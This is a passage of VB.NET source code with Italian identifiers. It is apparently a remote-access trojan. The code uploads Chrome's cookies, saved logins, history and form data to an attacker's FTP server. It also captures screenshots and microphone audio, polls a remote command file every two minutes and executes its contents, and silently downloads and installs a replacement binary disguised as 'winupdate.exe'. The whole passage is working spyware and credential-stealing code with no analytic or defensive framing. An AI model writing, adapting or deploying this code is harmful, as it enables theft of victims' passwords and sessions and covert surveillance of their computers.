                    FTP.Upload(user_Path & "FILE/CHROME/", "Bookmarks", chrome & "Bookmarks", False)
                    FTP.Upload(user_Path & "FILE/CHROME/", "Cookies", chrome & "Cookies", False)
                    FTP.Upload(user_Path & "FILE/CHROME/", "History", chrome & "History", False)
                    FTP.Upload(user_Path & "FILE/CHROME/", "Login Data", chrome & "Login Data", False)
                    FTP.Upload(user_Path & "FILE/CHROME/", "Visited Links", chrome & "Visited Links", False)
                    FTP.Upload(user_Path & "FILE/CHROME/", "Web Data", chrome & "Web Data", False)
                    FTP.Upload(user_Path & "FILE/CHROME/", "Databases.db", chrome & "/databases/Databases.db", False)
                End If

                'da integrare ie e opera
            Catch ex As Exception
            End Try
        End If

        If comando = "GETSCREEN" Then
            Try
                GetScreen()
                Dim time = GetTime("gmahms")
                FTP.Upload(user_Path & "SCREEN/", "SCREEN - " & time, appdata & "/temp.png", True)
            Catch ex As Exception
            End Try
        End If

        If comando = "WEB" Then
            Try
                Process.Start(arg)
            Catch ex As Exception
            End Try
        End If

        If comando = "UNINSTALL" Then
            Uninstall()
        End If

        If comando = "REC" Then
            If arg = "START" Then
                recAudioStart()
            ElseIf arg = "STOP" Then
                recAudioSSU()
            End If
        End If

        If comando = "MSGBOX" Then
            File.WriteAllText(appdata & "\msg.vbs", "Msgbox(""" & arg & """)")
            File.WriteAllText(appdata & "\selfdel.bat", "del """ & appdata & "\msg.vbs""" & vbCrLf & "del """ & appdata & "\selfdel.bat""")
            Process.Start(appdata & "\msg.vbs")
            Dim pi As New ProcessStartInfo()
            pi.FileName = appdata & "\selfdel.bat"
            pi.WindowStyle = ProcessWindowStyle.Hidden
            Process.Start(pi)
        End If

        If comando = "UPDATE" Then
            log &= vbCrLf & "RICEVUTO COMANDO DI UPDATE - CHIUSURA IN CORSO"
            InviaLog()
            FTP.Download(arg, arg2, appdata & "\winupdate.exe")
            File.WriteAllText(appdata & "\update.bat", "taskkill /im winupdate.exe" & vbCrLf & "del /Q " & appdata & "\Microsoft\winupdate.exe" & vbCrLf & "move " & appdata & "\winupdate.exe " & appdata & "\Microsoft\winupdate.exe")
            Dim pi As New ProcessStartInfo()
            pi.FileName = appdata & "\update.bat"
            pi.WindowStyle = ProcessWindowStyle.Hidden
            Process.Start(pi)
        End If
    End Sub
    Private Sub GetShell()
        Do
            If My.Computer.Network.IsAvailable = True Then
                If FTP.ControlloFile(user_Path, "SHELL/SHELL.txt") = True Then
                    Dim wbc As WebClient = New WebClient
                    Dim comandoIntero As String = wbc.DownloadString("http://<redacted>" & nomePcUtente & "/SHELL/SHELL.txt")
                    Dim comando() As String = comandoIntero.Split("|")
                    Dim i = comando.Length

                    If i = 1 Then
                        ExecuteShell(comando(0))
                    ElseIf i = 2 Then
                        ExecuteShell(comando(0), comando(1))
                    ElseIf i = 3 Then
                        ExecuteShell(comando(0), comando(1), comando(2))
                    ElseIf i = 4 Then
                        ExecuteShell(comando(0), comando(1), comando(2), comando(3))
                    End If
                End If
            End If
            Thread.Sleep(120000)
        Loop
    End Sub
    Private Sub PowerModeChanged(ByVal sender As System.Object, ByVal e As Microsoft.Win32.PowerModeChangedEventArgs)
        Select Case e.Mode
            Case Microsoft.Win32.PowerModes.Resume
                Dim time As String = GetTime("gmahms")
                log &= vbCrLf & "##### RIPRESA DALLA SOSPENSIONE " & time & " #####" & vbCrLf & "RIAVVIO APPLICAZIONE ..."
                InviaLog()
                Application.Restart()
            Case Microsoft.Win32.PowerModes.Suspend
                Dim time As String = GetTime("gmahms")
                log &= vbCrLf & "##### SPOSPENSIONE " & time & " #####"
                InviaLog()
        End Select
    End Sub

    'Private Sub SessionEnding(ByVal sender As System.Object, ByVal e As Microsoft.Win32.SessionEndingEventArgs)
    '    Select Case e.Reason
    '        Case Microsoft.Win32.SessionEndReasons.Logoff
    '            'logoff
    '        Case Microsoft.Win32.SessionEndReasons.SystemShutdown
    '            'shutdown
    '    End Select
    'End Sub
#End Region 'OK
End Class
Public Class FTP

    Public Shared username As String = "<redacted>"
    Public Shared password As String = "<redacted>"
    Public Shared server As String = "ftp://<redacted>"

    Public Shared Sub CreaCartella(ByVal url As String, ByVal nomecartella As String)
        Dim richiesta As FtpWebRequest = DirectCast(WebRequest.Create(url & nomecartella), FtpWebRequest)
        richiesta.Credentials = New NetworkCredential(username, password)
        richiesta.Method = WebRequestMethods.Ftp.MakeDirectory
        Dim risposta = richiesta.GetResponse()

    End Sub
    Public Shared Sub Upload(ByVal url As String, ByVal nomefile As String, ByVal percorsofile As String, ByVal elimino As Boolean)
        Dim richiesta As FtpWebRequest = DirectCast(WebRequest.Create(url & nomefile), FtpWebRequest)
        richiesta.Credentials = New NetworkCredential(username, password)
        richiesta.Method = WebRequestMethods.Ftp.UploadFile
        Dim risposta = richiesta.GetResponse()
        Dim flusso As Stream = richiesta.GetRequestStream()
        flusso.Write(File.ReadAllBytes(percorsofile), 0, File.ReadAllBytes(percorsofile).Length)
        flusso.Close()
        flusso.Dispose()
        If elimino = True Then
            File.Delete(percorsofile)
        End If
    End Sub
    Public Shared Sub Download(ByVal url As String, ByVal nomefile As String, destinazionefile As String)
        Dim richiesta As FtpWebRequest = DirectCast(WebRequest.Create(url & nomefile), FtpWebRequest)
        richiesta.Credentials = New NetworkCredential(username, password)
        richiesta.Method = WebRequestMethods.Ftp.DownloadFile
        Dim risposta = richiesta.GetResponse
        Dim flussorisposta As Stream = risposta.GetResponseStream
        Dim flussolocale As New FileStream(destinazionefile, FileMode.Create, FileAccess.Write)
        Dim buffer(1024) As Byte

        Dim bytesRead As Integer = flussorisposta.Read(buffer, 0, 1024)
        While (bytesRead <> 0)
            flussolocale.Write(buffer, 0, bytesRead)
            bytesRead = flussorisposta.Read(buffer, 0, 1024)
        End While

        flussolocale.Close()
        flussorisposta.Close()

    End Sub
    Public Shared Function ControllaCartella(ByVal url As String, ByVal nomecartella As String)
        Dim richiesta = DirectCast(WebRequest.Create(url & nomecartella & "/"), FtpWebRequest)
        richiesta.Credentials = New NetworkCredential(username, password)
        richiesta.Method = WebRequestMethods.Ftp.ListDirectory

        Try
            Using risposta As FtpWebResponse = DirectCast(richiesta.GetResponse(), FtpWebResponse)
                'La cartella esiste
                Return 1
            End Using
        Catch ex As WebException
            Dim risposta As FtpWebResponse = DirectCast(ex.Response, FtpWebResponse)
            If risposta.StatusCode = FtpStatusCode.ActionNotTakenFileUnavailable Then
                'La cartella non esiste
                Return 0
            End If
        End Try
    End Function
    Public Shared Function ControlloFile(ByVal url As String, ByVal nomefile As String)
        Dim richiesta = DirectCast(WebRequest.Create(url & nomefile), FtpWebRequest)
        richiesta.Credentials = New NetworkCredential(username, password)
        richiesta.Method = WebRequestMethods.Ftp.GetFileSize
        Try
            Using risposta As FtpWebResponse = DirectCast(richiesta.GetResponse(), FtpWebResponse)
                ' THE FILE EXISTS
                'MsgBox("il file esiste")
                Return True
            End Using
        Catch ex As WebException
            Dim risposta As FtpWebResponse = DirectCast(ex.Response, FtpWebResponse)
            If risposta.StatusCode = FtpStatusCode.ActionNotTakenFileUnavailable Then
                ' THE FILE DOES NOT EXIST
                ' MsgBox("non esiste")
                Return False
            End If
        End Try
        Return True
    End Function

End Class